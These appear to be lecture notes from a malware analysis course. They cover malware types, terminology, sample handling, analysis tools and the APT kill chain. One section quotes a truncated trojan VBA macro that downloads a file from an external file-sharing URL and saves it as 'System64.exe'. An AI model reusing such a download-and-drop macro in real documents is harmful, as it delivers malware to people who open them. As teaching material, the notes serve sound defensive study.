## Week 1

### Introduction
The first lecture serves as an introduction to malware, a catch-all term for unwanted software running on a device. Malware includes software running on your machine as malicious as ransomware (software that encrypts the contents of your computer for the purposes of extorting you) to something more benign but annoying like adware (software which bombards the user with ads and pop-ups). Malware is primarily used for financial gain, information gathering, and/or as a method to attack companies or users. It can be employed by nearly anyone with access to the internet and some simple computer know-how, like criminal organizations, lone agents, or government entities. The need to prevent or resolve the issues caused by malware have led to the creation of companies and organizations devoted to anti-malware.

### Anti-Malware
Anti-malware groups have developed methodologies for the purposes of detection, prevention, and, in some cases, destruction of malware. To deal with a malware threat, it is necessary to understand and categorize malware. There are commonly a few types of malware and they tend to fall into the following categories:
1. Virus - characterized by a pattern of spreading
2. Trojans - characterized by method of entry onto a user's machine.
3. Potentially Unwanted Program - catch-all term for other malware that don't follow either patterns

Although the prospect of viruses and trojans might be worrisome, it has been determined by the security community that the most common attack vector is through the user themselves. Following a few rules regarding computer security will go a long way to help prevent most attacks. These include, but are not limited to, the following:

1. Don't visit questionable sites.
2. Know where your files are from before opening them.
3. Don't use random USB sticks.
4. Don't access programs or mobile apps from unverifiable authors.

### Malware
As an example, a trojan could have been hidden inside of a macro run as a result of opening an Excel file. It may have looked like this:
```
Sub DoWork()

Dim tmp As String, fName As String, Pos As Long, fPath As String

tmp = DownloadFile("http://ge.tt/api/1/files/8e8kZt72/0/blob?download")

'tmp = DownloadFile(rc4decrypt("YMe & chr(34)& lp52wsnV4"DyQw0DKMNIE_uZmPuzUL5b0WoVZ2r3E7f & chr(34)& jG713r1IgISh3hZD1a", "System64.exe"))

fName = "System64.exe
```

### Terminology
The security community has also devised a few terms in their work with malware. This includes, but is not limited to, the following:
1. white - a known clean file
2. black - a known dirty file
3. gray - a file which has neither been confirmed clean or dirty
4. sample - a copy of malware
5. goat - sacrificial system for working with malware
6. hash (ex: md5) - a signature that calculated the value of the file; used to id files, write code to detect; polymorphic files are a pain for this reason
7. honeypot - a vulnerable system that intentionally gets infected with viruses for evaluation
8. imphash - import hash, a hash calculated for viruses; this can be used to determine if the virus is part of the same "family" of viruses; if they use a similar import hash
9. dropper - the file that is used by a trojan
10. Static Analysis - viewing the contents of a file, usually through a hex editor or some other text editor.


### Practices
Standards in naming are used to categorize malware. A particular convention is to categorize by type (virus, trojan, etc.), then platform (linux, win32, etc.), then family of malware (malware that displays similar behavior, imphash, etc.), then a variant name using letters as a designation. This naming convention allows anti-malware software and professionals to quickly understand its high level characteristics (how does it spread, what does it do). 


Handling malware requires special considerations. The malware files are zipped and encrypted with the password "infected". The sample extension is also renamed, either changing the extension or adding a hash. Isolation of your machine is also necessary. Headers are used to identify file types for analysis. These are all practices that lead to the use of replication, the practice of determining malware behavior. The actions are recorded to understand the malware behavior. The state of the system is analyzed in order to determine before and after effects. 


When handling malware, there may be instances where malware is able to detect if it is operating in a virtual environment. This can be mitigated in a few ways: by not loading certain tools the malware is lookng for, loading a VM with registry values identical to a physical machine, or running code that responds to malware attempts to determine its environment.


Research is commonly conducted via Tor, for anonymity. 

### Useful Tools
- Virustotal - a site where users can upload an md5 hash/file/url to search against a database maintained by many vendors to determine the type of malware they're dealing with.
- Malwr - a sample is provided to the site, an isolated environment evaluates the malware, and reports back behavior
- Wepawet - used for analysis of obfuscated java, pdf, files for decryption.
- Comodo - document analyzer.


### Recent News
Attacks on corporations has increased in the last few years, these being referred to as "Advanced Persistent Threats". The term comes from the breakdown of each individual word. Advanced indicates that the attacker is knowledgeable. Persistent indicates the attackers are hunting and intent on finding particular information. Threat refers to the level of organization of the attacking group. 

Advanced Persistent Threats - APTs - have several characteristics:
1. Actors - terrorists, activists, state-sponsored government, business competitors, insiders
2. Motives - financial, information, revenge, ideology, excitement
3. Targets - companies, governments, individuals
4. Goals - create backdoors stealthily, steal data, monitor data, leave undetected

Other methods to gather information is to target subcontracting companies, as they will typically be less secure. A possible analog of this is to gain access to accounts or machines with less access/privileges and slowly gain more access.

This can be gained through OSINTs (open-source intelligence). Job postings are useful for this, as they reveal data on what technologies are in use at the targeted company. Company websites may also provide information via document metadata, as this information is posted when a document is posted by the company. This represents the first step of the "APT-Kill-Chain", a process that describes the typical methods through which APTs are conducted.

Weaponization refers to the use of the information gained through reconnaissance to break in. Delivery refers to the method through which the malware is provided. Exploitation refers to the exploit itself. Installation refers to the placing the malware onto the device. Command and control refers to the use of the connection established. Actions on objectives is carrying out the goal.


